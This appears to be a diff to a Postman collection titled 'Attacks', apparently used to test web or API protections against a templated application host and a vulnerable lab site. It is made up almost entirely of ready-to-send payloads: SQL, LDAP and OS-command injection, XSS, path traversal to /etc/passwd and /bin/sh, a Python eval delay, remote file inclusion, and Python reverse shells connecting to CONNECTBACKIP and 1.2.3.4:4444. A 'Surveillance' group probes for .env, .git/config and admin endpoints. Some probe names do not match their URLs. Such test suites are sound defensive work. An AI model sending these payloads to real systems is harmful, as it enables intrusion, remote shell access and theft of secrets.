@@ -1,16 +1,15 @@
-
 {
 	"info": {
+		"_postman_id": "ada4f380-ec5e-4fe0-92a7-a79a9477ff5d",
 		"name": "Attacks",
 		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
-
 	},
 	"item": [
 		{
 			"name": "JSON Attacks",
 			"item": [
 				{
-					"name": "/api/v2/notesearch (SQL Inj) Copy",
+					"name": "/api/v2/notesearch (SQL INJ)",
 					"request": {
 						"method": "POST",
 						"header": [],
@@ -40,7 +39,7 @@
 					"response": []
 				},
 				{
-					"name": "/api/v2/notesearch (XSS) Copy",
+					"name": "/api/v2/notesearch (XSS)",
 					"request": {
 						"method": "POST",
 						"header": [],
@@ -70,7 +69,7 @@
 					"response": []
 				},
 				{
-					"name": "/api/v2/notesearch (Traversal) Copy",
+					"name": "/api/v2/notesearch (Traversal)",
 					"request": {
 						"method": "POST",
 						"header": [],
@@ -100,7 +99,7 @@
 					"response": []
 				},
 				{
-					"name": "/api/v2/notesearch (LDAP Injection) Copy",
+					"name": "/api/v2/notesearch (LDAP Injection)",
 					"request": {
 						"method": "POST",
 						"header": [],
@@ -130,7 +129,7 @@
 					"response": []
 				},
 				{
-					"name": "/api/v2/notesearch (RFI) Copy",
+					"name": "/api/v2/notesearch (RFI)",
 					"request": {
 						"method": "POST",
 						"header": [],
@@ -160,7 +159,7 @@
 					"response": []
 				},
 				{
-					"name": "/api/v2/notesearch (PHP Python) Copy",
+					"name": "/api/v2/notesearch (PHP Python)",
 					"request": {
 						"method": "POST",
 						"header": [],
@@ -190,7 +189,230 @@
 					"response": []
 				},
 				{
-					"name": "/api/v2/sysinfo/uname (OS Command) Copy",
+					"name": "/api/v2/sysinfo/uname (OS Command)",
+					"protocolProfileBehavior": {
+						"disableBodyPruning": true,
+						"disabledSystemHeaders": {
+							"connection": true
+						}
+					},
+					"request": {
+						"method": "GET",
+						"header": [
+							{
+								"key": "Referer",
+								"value": "https://dvws.darklab.co/admin.html",
+								"type": "text"
+							},
+							{
+								"key": "Connection",
+								"value": "close",
+								"type": "text"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "https://{{appname}}/api/v2/sysinfo/uname;curl -D- localhost",
+							"protocol": "https",
+							"host": [
+								"{{appname}}"
+							],
+							"path": [
+								"api",
+								"v2",
+								"sysinfo",
+								"uname;curl -D- localhost"
+							]
+						}
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "JSON REST Admin Attacks",
+			"item": [
+				{
+					"name": "/rest/admin (SQL Inj)",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\r\n    \"search\":\"%32%27%20%61%6e%64%20%27%31%27%3d%27%31\"\r\n}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "https://{{appname}}/rest/admin",
+							"protocol": "https",
+							"host": [
+								"{{appname}}"
+							],
+							"path": [
+								"rest",
+								"admin"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "/rest/admin (XSS)",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\r\n    \"search\":\"<script>document.domain</script>\"\r\n}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "https://{{appname}}/rest/admin",
+							"protocol": "https",
+							"host": [
+								"{{appname}}"
+							],
+							"path": [
+								"rest",
+								"admin"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "/rest/admin (Traversal)",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\r\n    \"search\":\"../../../../../../etc/passwd\"\r\n}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "https://{{appname}}/rest/admin",
+							"protocol": "https",
+							"host": [
+								"{{appname}}"
+							],
+							"path": [
+								"rest",
+								"admin"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "/rest/admin (LDAP Injection)",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\r\n    \"search\":\"username=*)|(userPassword=&password=*)\"\r\n}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "https://{{appname}}/rest/admin/role",
+							"protocol": "https",
+							"host": [
+								"{{appname}}"
+							],
+							"path": [
+								"rest",
+								"admin",
+								"role"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "/rest/admin (RFI)",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\r\n    \"search\":\"https://remote.file.com/payload.exe\"\r\n}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "https://{{appname}}/api/v2/notesearch/",
+							"protocol": "https",
+							"host": [
+								"{{appname}}"
+							],
+							"path": [
+								"api",
+								"v2",
+								"notesearch",
+								""
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "/rest/admin(PHP Python)",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\r\n    \"search\":\"setdatasourceusername=admin || setdatasourcepassword=*\"\r\n}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "https://{{appname}}/rest/admin",
+							"protocol": "https",
+							"host": [
+								"{{appname}}"
+							],
+							"path": [
+								"rest",
+								"admin"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "/rest/admin (OS Command)",
 					"protocolProfileBehavior": {
 						"disableBodyPruning": true,
 						"disabledSystemHeaders": {
@@ -242,6 +464,85 @@
 			"name": "Attacks",
 			"item": [
 				{
+					"name": "OS Command in Header",
+					"protocolProfileBehavior": {
+						"disableBodyPruning": true,
+						"disabledSystemHeaders": {
+							"user-agent": true
+						}
+					},
+					"request": {
+						"method": "GET",
+						"header": [
+							{
+								"key": "User-Agent",
+								"value": "Mozilla/5.0 (compatible; Nmap Scripting Engine; https\\://nmap.org/book/nse.html",
+								"type": "text"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "https://{{appname}}/svn/",
+							"protocol": "https",
+							"host": [
+								"{{appname}}"
+							],
+							"path": [
+								"svn",
+								""
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "OS Command in URL",
+					"protocolProfileBehavior": {
+						"disableBodyPruning": true,
+						"disabledSystemHeaders": {
+							"user-agent": true
+						}
+					},
+					"request": {
+						"method": "GET",
+						"header": [
+							{
+								"key": "User-Agent",
+								"value": "Mozilla/5.0 (compatible; Nmap Scripting Engine; https\\://nmap.org/book/nse.html",
+								"type": "text"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "https://{{appname}}/robots.txt'%2beval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))%2b'",
+							"protocol": "https",
+							"host": [
+								"{{appname}}"
+							],
+							"path": [
+								"robots.txt'%2beval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))%2b'"
+							]
+						}
+					},
+					"response": []
+				},
+				{
 					"name": "HTTP Specific Attack in Parameter",
 					"protocolProfileBehavior": {
 						"disabledSystemHeaders": {
@@ -258,10 +559,12 @@
 							}
 						],
 						"url": {
-							"raw": "https:///{{appname}}/?';wget",
+							"raw": "https://{{appname}}/?';wget",
 							"protocol": "https",
+							"host": [
+								"{{appname}}"
+							],
 							"path": [
-								"{{appname}}",
 								""
 							],
 							"query": [
@@ -291,10 +594,12 @@
 							}
 						],
 						"url": {
-							"raw": "https:///{{appname}}/../../../../../etc/passwd",
+							"raw": "https://{{appname}}/../../../../../etc/passwd",
 							"protocol": "https",
+							"host": [
+								"{{appname}}"
+							],
 							"path": [
-								"{{appname}}",
 								"..",
 								"..",
 								"..",
@@ -313,10 +618,12 @@
 						"method": "GET",
 						"header": [],
 						"url": {
-							"raw": "https:///{{appname}}/?<script>document.popup(bad.js)</script>",
+							"raw": "https://{{appname}}/?<script>document.popup(bad.js)</script>",
 							"protocol": "https",
+							"host": [
+								"{{appname}}"
+							],
 							"path": [
-								"{{appname}}",
 								""
 							],
 							"query": [
@@ -397,7 +704,7 @@
 					"response": []
 				},
 				{
-					"name": "Invalid Method/Verb",
+					"name": "Method Not Allowed",
 					"request": {
 						"method": "DELETE",
 						"header": [],
@@ -436,6 +743,431 @@
 							],
 							"path": [
 								"`(&(uid=*)(password=*))`"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "OS Command in Header",
+					"protocolProfileBehavior": {
+						"disableBodyPruning": true,
+						"disabledSystemHeaders": {
+							"user-agent": true
+						}
+					},
+					"request": {
+						"method": "GET",
+						"header": [
+							{
+								"key": "User-Agent",
+								"value": "Mozilla/5.0 (compatible; Nmap Scripting Engine; https\\\\://nmap.org/book/nse.html",
+								"type": "text"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\r\n    \"search\":\"%32%27%20%61%6e%64%20%27%31%27%3d%27%31\"\r\n}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "https://{{appname}}/api/v1/totp/user-backup-code/../../license/keys-status/%3Bpython%20%2Dc%20%27import%20socket%2Csubprocess%3Bs%3Dsocket%2Esocket%28socket%2EAF%5FINET%2Csocket%2ESOCK%5FSTREAM%29%3Bs%2Econnect%28%28%22CONNECTBACKIP%22%2CCONNECTBACKPORT%29%29%3Bsubprocess%2Ecall%28%5B%22%2Fbin%2Fsh%22%2C%22%2Di%22%5D%2Cstdin%3Ds%2Efileno%28%29%2Cstdout%3Ds%2Efileno%28%29%2Cstderr%3Ds%2Efileno%28%29%29%27%3B",
+							"protocol": "https",
+							"host": [
+								"{{appname}}"
+							],
+							"path": [
+								"api",
+								"v1",
+								"totp",
+								"user-backup-code",
+								"..",
+								"..",
+								"license",
+								"keys-status",
+								"%3Bpython%20%2Dc%20%27import%20socket%2Csubprocess%3Bs%3Dsocket%2Esocket%28socket%2EAF%5FINET%2Csocket%2ESOCK%5FSTREAM%29%3Bs%2Econnect%28%28%22CONNECTBACKIP%22%2CCONNECTBACKPORT%29%29%3Bsubprocess%2Ecall%28%5B%22%2Fbin%2Fsh%22%2C%22%2Di%22%5D%2Cstdin%3Ds%2Efileno%28%29%2Cstdout%3Ds%2Efileno%28%29%2Cstderr%3Ds%2Efileno%28%29%29%27%3B"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "/api/ Python Reverse Shell JSON Body",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\r\n    \"type\": \";python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"1.2.3.4\\\",4444));subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())';\",\r\n    \"txtGCPProject\": \"a\",\r\n    \"txtGCPSecret\": \"a\",\r\n    \"txtGCPPath\": \"a\",\r\n    \"txtGCPBucket\": \"a\"\r\n}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "https://{{appname}}/api/challenges/",
+							"protocol": "https",
+							"host": [
+								"{{appname}}"
+							],
+							"path": [
+								"api",
+								"challenges",
+								""
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "Directory Traversal in Parameter",
+					"protocolProfileBehavior": {
+						"disableBodyPruning": true,
+						"disabledSystemHeaders": {
+							"user-agent": true
+						}
+					},
+					"request": {
+						"method": "GET",
+						"header": [
+							{
+								"key": "User-Agent",
+								"value": "Mozilla/5.0 (compatible; Nmap Scripting Engine; https\\://nmap.org/book/nse.html",
+								"type": "text"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "https://{{appname}}?lang=/../../../..//////////dev/cmdb/sslvpn_websession",
+							"protocol": "https",
+							"host": [
+								"{{appname}}"
+							],
+							"query": [
+								{
+									"key": "lang",
+									"value": "/../../../..//////////dev/cmdb/sslvpn_websession"
+								}
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "Directory Traversal Partial URL Encoding",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "https://{{appname}}/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh",
+							"protocol": "https",
+							"host": [
+								"{{appname}}"
+							],
+							"path": [
+								"cgi-bin",
+								".%2e",
+								".%2e",
+								".%2e",
+								".%2e",
+								".%2e",
+								".%2e",
+								".%2e",
+								".%2e",
+								".%2e",
+								".%2e",
+								"bin",
+								"sh"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "Directory Traversal Full URL Encoding",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "https://{{appname}}/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh",
+							"protocol": "https",
+							"host": [
+								"{{appname}}"
+							],
+							"path": [
+								"cgi-bin",
+								"%%32%65%%32%65",
+								"%%32%65%%32%65",
+								"%%32%65%%32%65",
+								"%%32%65%%32%65",
+								"%%32%65%%32%65",
+								"%%32%65%%32%65",
+								"%%32%65%%32%65",
+								"bin",
+								"sh"
+							]
+						}
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "Surveillance",
+			"item": [
+				{
+					"name": "/.env",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "https:///{{appname}}/.env",
+							"protocol": "https",
+							"path": [
+								"{{appname}}",
+								".env"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "DNS query",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "https:///{{appname}}/dns-query",
+							"protocol": "https",
+							"path": [
+								"{{appname}}",
+								"dns-query"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": ".git/config",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "https:///{{appname}}/.git/config",
+							"protocol": "https",
+							"path": [
+								"{{appname}}",
+								".git",
+								"config"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": ".well-known",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "https:///{{appname}}/.well-known/",
+							"protocol": "https",
+							"path": [
+								"{{appname}}",
+								".well-known",
+								""
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "admin",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "https:///{{appname}}/admin",
+							"protocol": "https",
+							"path": [
+								"{{appname}}",
+								"admin"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": ".well-known/security.txt",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "https:///{{appname}}/.well-known/security.txt",
+							"protocol": "https",
+							"path": [
+								"{{appname}}",
+								".well-known",
+								"security.txt"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "boaform",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "https:///{{appname}}/boaform/admin/formLogin?username=user&psd=user",
+							"protocol": "https",
+							"path": [
+								"{{appname}}",
+								"boaform",
+								"admin",
+								"formLogin"
+							],
+							"query": [
+								{
+									"key": "username",
+									"value": "user"
+								},
+								{
+									"key": "psd",
+									"value": "user"
+								}
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "rest application-version",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "https:///{{appname}}/rest/admin/application-version",
+							"protocol": "https",
+							"path": [
+								"{{appname}}",
+								"rest",
+								"admin",
+								"application-version"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "/actuator/gateway/routes",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "https:///{{appname}}/actuator/gateway/routes",
+							"protocol": "https",
+							"path": [
+								"{{appname}}",
+								"actuator",
+								"gateway",
+								"routes"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "/.DS_Store probing",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "https:///{{appname}}/.DS_Store",
+							"protocol": "https",
+							"path": [
+								"{{appname}}",
+								".DS_Store"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "HTTP 2.0 Probing",
+					"request": {
+						"method": "PRI",
+						"header": [],
+						"url": {
+							"raw": "https:///{{appname}}/*",
+							"protocol": "https",
+							"path": [
+								"{{appname}}",
+								"*"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "/runtime.js",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "https:///{{appname}}/cvs/",
+							"protocol": "https",
+							"path": [
+								"{{appname}}",
+								"cvs",
+								""
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "/svn/",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "https:///{{appname}}/cvs/",
+							"protocol": "https",
+							"path": [
+								"{{appname}}",
+								"cvs",
+								""
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "/runtime.js",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "https:///{{appname}}/runtime.js",
+							"protocol": "https",
+							"path": [
+								"{{appname}}",
+								"runtime.js"
 							]
 						}
 					},
